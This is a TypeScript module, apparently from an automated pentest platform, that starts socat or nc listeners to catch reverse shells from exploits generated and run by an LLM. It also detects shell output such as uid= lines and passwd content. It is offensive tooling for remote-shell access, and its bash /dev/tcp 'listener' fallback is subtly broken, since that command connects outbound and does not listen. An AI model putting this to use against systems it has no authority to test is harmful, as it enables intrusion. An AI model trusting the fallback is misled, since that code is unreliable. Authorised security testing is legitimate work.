/**
 * Reverse Shell Listener
 *
 * Manages a netcat/socat listener on the scan server to catch reverse shells
 * from LLM-generated exploits. The LLM exploit generator already includes
 * reverse shell payloads (bash, python, perl, nc) but previously had no
 * listener running to catch them.
 *
 * Flow:
 * 1. Start a socat/nc listener on a random high port on the scan server
 * 2. Set ATTACKER_HOST and ATTACKER_PORT in the exploit environment
 * 3. Run the exploit
 * 4. Check if a connection was received
 * 5. Clean up the listener
 *
 * Used by:
 * - enhanced-exploit-orchestration.ts (executeDirectExploit for LLM-generated exploits)
 */

export interface ListenerConfig {
  /** Port to listen on (will be randomly assigned if not specified) */
  port?: number;
  /** Timeout in seconds to wait for a connection */
  timeoutSecs?: number;
  /** Engagement ID for identification */
  engagementId?: number;
}

export interface ListenerResult {
  /** Whether a connection was received */
  connectionReceived: boolean;
  /** The port the listener was on */
  port: number;
  /** Output captured from the connection */
  output: string;
  /** PID of the listener process (for cleanup) */
  pid?: string;
  /** Duration in ms */
  durationMs: number;
}

/**
 * Start a reverse shell listener on the scan server.
 * Returns the port and a function to check/stop the listener.
 */
export async function startReverseShellListener(
  executeRawCommand: (cmd: string, opts?: any) => Promise<{ stdout: string; stderr: string; exitCode: number }>,
  config: ListenerConfig = {},
): Promise<{
  port: number;
  pid: string;
  checkAndStop: () => Promise<ListenerResult>;
}> {
  const port = config.port || (5000 + Math.floor(Math.random() * 4000));
  const timeout = config.timeoutSecs || 30;
  const engId = config.engagementId || Date.now();
  const outputFile = `/tmp/revshell_${engId}_${port}.log`;
  const pidFile = `/tmp/revshell_${engId}_${port}.pid`;
  const startTime = Date.now();

  // Kill any existing listener on this port
  await executeRawCommand(`fuser -k ${port}/tcp 2>/dev/null || true`, { timeout: 5 });

  // Start socat listener in background — captures connection output to file
  // socat is preferred over nc because it handles PTY allocation better
  const listenerCmd = [
    `(socat TCP-LISTEN:${port},reuseaddr,fork STDOUT > ${outputFile} 2>&1 &`,
    `echo $! > ${pidFile}) 2>/dev/null`,
  ].join(' ');

  await executeRawCommand(listenerCmd, { timeout: 10 });

  // Verify listener started
  const pidResult = await executeRawCommand(`cat ${pidFile} 2>/dev/null`, { timeout: 5 });
  const pid = (pidResult.stdout || '').trim();

  // If socat isn't available, fall back to netcat
  if (!pid) {
    const ncCmd = [
      `(nc -lvp ${port} > ${outputFile} 2>&1 &`,
      `echo $! > ${pidFile}) 2>/dev/null`,
    ].join(' ');
    await executeRawCommand(ncCmd, { timeout: 10 });
    const ncPidResult = await executeRawCommand(`cat ${pidFile} 2>/dev/null`, { timeout: 5 });
    const ncPid = (ncPidResult.stdout || '').trim();
    if (!ncPid) {
      // Last resort: use bash /dev/tcp listener
      const bashCmd = `(while true; do bash -c "cat < /dev/tcp/0.0.0.0/${port}" >> ${outputFile} 2>&1; done & echo $! > ${pidFile}) 2>/dev/null`;
      await executeRawCommand(bashCmd, { timeout: 10 });
    }
  }

  const finalPidResult = await executeRawCommand(`cat ${pidFile} 2>/dev/null`, { timeout: 5 });
  const finalPid = (finalPidResult.stdout || '').trim();

  return {
    port,
    pid: finalPid,
    checkAndStop: async (): Promise<ListenerResult> => {
      // Wait a moment for any data to arrive
      await executeRawCommand(`sleep 2`, { timeout: 5 });

      // Check if we received any connection data
      const outputResult = await executeRawCommand(`cat ${outputFile} 2>/dev/null`, { timeout: 10 });
      const output = outputResult.stdout || '';

      // Check if the port had any connections (via ss/netstat)
      const connCheck = await executeRawCommand(
        `ss -tn state established "( sport = :${port} )" 2>/dev/null | grep -c ESTAB || echo 0`,
        { timeout: 5 },
      );
      const activeConns = parseInt((connCheck.stdout || '0').trim(), 10);

      // Check output file size
      const sizeCheck = await executeRawCommand(`stat -c%s ${outputFile} 2>/dev/null || echo 0`, { timeout: 5 });
      const fileSize = parseInt((sizeCheck.stdout || '0').trim(), 10);

      // Determine if a shell connected
      const connectionReceived = activeConns > 0 || fileSize > 0 || hasShellIndicators(output);

      // Clean up
      if (finalPid) {
        await executeRawCommand(`kill ${finalPid} 2>/dev/null; kill -9 ${finalPid} 2>/dev/null || true`, { timeout: 5 });
      }
      await executeRawCommand(`fuser -k ${port}/tcp 2>/dev/null || true`, { timeout: 5 });
      await executeRawCommand(`rm -f ${outputFile} ${pidFile}`, { timeout: 5 });

      return {
        connectionReceived,
        port,
        output: output.substring(0, 2000), // Limit output size
        pid: finalPid,
        durationMs: Date.now() - startTime,
      };
    },
  };
}

/**
 * Check if captured output contains shell indicators
 */
function hasShellIndicators(output: string): boolean {
  if (!output || output.length === 0) return false;

  const shellPatterns = [
    /\$\s*$/m,           // Shell prompt
    /#\s*$/m,            // Root prompt
    /uid=\d+/,           // id command output
    /root:/,             // /etc/passwd content
    /www-data/,          // Web user
    /Linux\s+\S+\s+\d/, // uname output
    /bash.*version/i,    // Bash version
    /sh-\d+/,           // sh prompt
    /connected/i,        // Connection message
  ];

  return shellPatterns.some(p => p.test(output));
}

/**
 * Quick utility to check if the scan server has socat/nc available
 */
export async function checkListenerTools(
  executeRawCommand: (cmd: string, opts?: any) => Promise<{ stdout: string; stderr: string; exitCode: number }>,
): Promise<{ socat: boolean; nc: boolean }> {
  const socatCheck = await executeRawCommand('which socat 2>/dev/null', { timeout: 5 });
  const ncCheck = await executeRawCommand('which nc 2>/dev/null || which ncat 2>/dev/null', { timeout: 5 });
  return {
    socat: (socatCheck.stdout || '').trim().length > 0,
    nc: (ncCheck.stdout || '').trim().length > 0,
  };
}
